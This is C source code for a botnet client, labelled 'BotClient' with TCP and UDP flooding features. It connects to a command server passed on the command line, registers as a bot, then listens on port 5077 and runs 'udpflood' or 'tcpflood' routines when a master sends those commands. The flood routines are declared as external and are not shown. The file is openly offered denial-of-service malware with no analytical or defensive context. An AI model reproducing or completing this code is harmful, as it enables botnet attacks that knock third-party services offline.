/* BotClient
: Features :
- tcpflooder
- udpflooder
*/

#include "std_hdr.h"
#include "net_hdr.h"
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/time.h>

#define bindport 5077
#define sendport 7705

extern void udpflood();
extern void tcpflood();
extern int numgen(int start,int end,int length);
void buffclean();

char arg1[50],arg2[50],arg3[50],arg4[50],arg5[1024];
char buffer[1024];

int sockfd, newsockfd, tsockfd;
struct sockaddr_in serv_addr, mstr_addr, Tserv_addr;
socklen_t targ_len = sizeof(Tserv_addr);
socklen_t serv_len = sizeof(serv_addr);
socklen_t mstr_len = sizeof(mstr_addr);

//bot.c <server> <port>
int main(int argc,char *argv[])
{
	if (argc < 3)
		{
			printf("bot <server.ip> <port>\n");
			return 0;
		}
     sockfd = socket(AF_INET, SOCK_STREAM, 0);
     if (sockfd < 0) 
        return 0;
     bzero((char *) &serv_addr, sizeof(serv_addr));
     serv_addr.sin_family = AF_INET;
     serv_addr.sin_addr.s_addr = inet_addr(argv[1]);
     serv_addr.sin_port = htons(atoi(argv[2]));
	while (connect(sockfd,(struct sockaddr *) &serv_addr,serv_len) == -1)
		{ continue; }
	bzero(buffer,1024);
	write(sockfd,"bot\r\n",strlen("bot\r\n"));
     bzero((char *) &serv_addr, serv_len);
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd < 0) 
        return 0;
     serv_addr.sin_family = AF_INET;
     serv_addr.sin_addr.s_addr = INADDR_ANY;
     serv_addr.sin_port = htons(5077);
     if (bind(sockfd, (struct sockaddr *) &serv_addr,serv_len) < 0) 
              return 0;
     listen(sockfd,SOMAXCONN);
     newsockfd = accept(sockfd, (struct sockaddr *) &mstr_addr,&mstr_len);
     if (newsockfd < 0) 
          return 0;
	while(1)
	{
     read(newsockfd,buffer,1024);
     buffer[strlen(buffer)-2] = '\0';
	sscanf(buffer,"%s %*s %*s %*s %*s",arg1);
	if (strcmp(arg1,"udpflood") == 0) udpflood();
	if (strcmp(arg1,"tcpflood") == 0) tcpflood();
	buffclean();
	}
}

void buffclean()
{
bzero(buffer,1024);
bzero(arg1,50);
bzero(arg2,50);
bzero(arg3,50);
bzero(arg4,50);
bzero(arg5,1024);
}
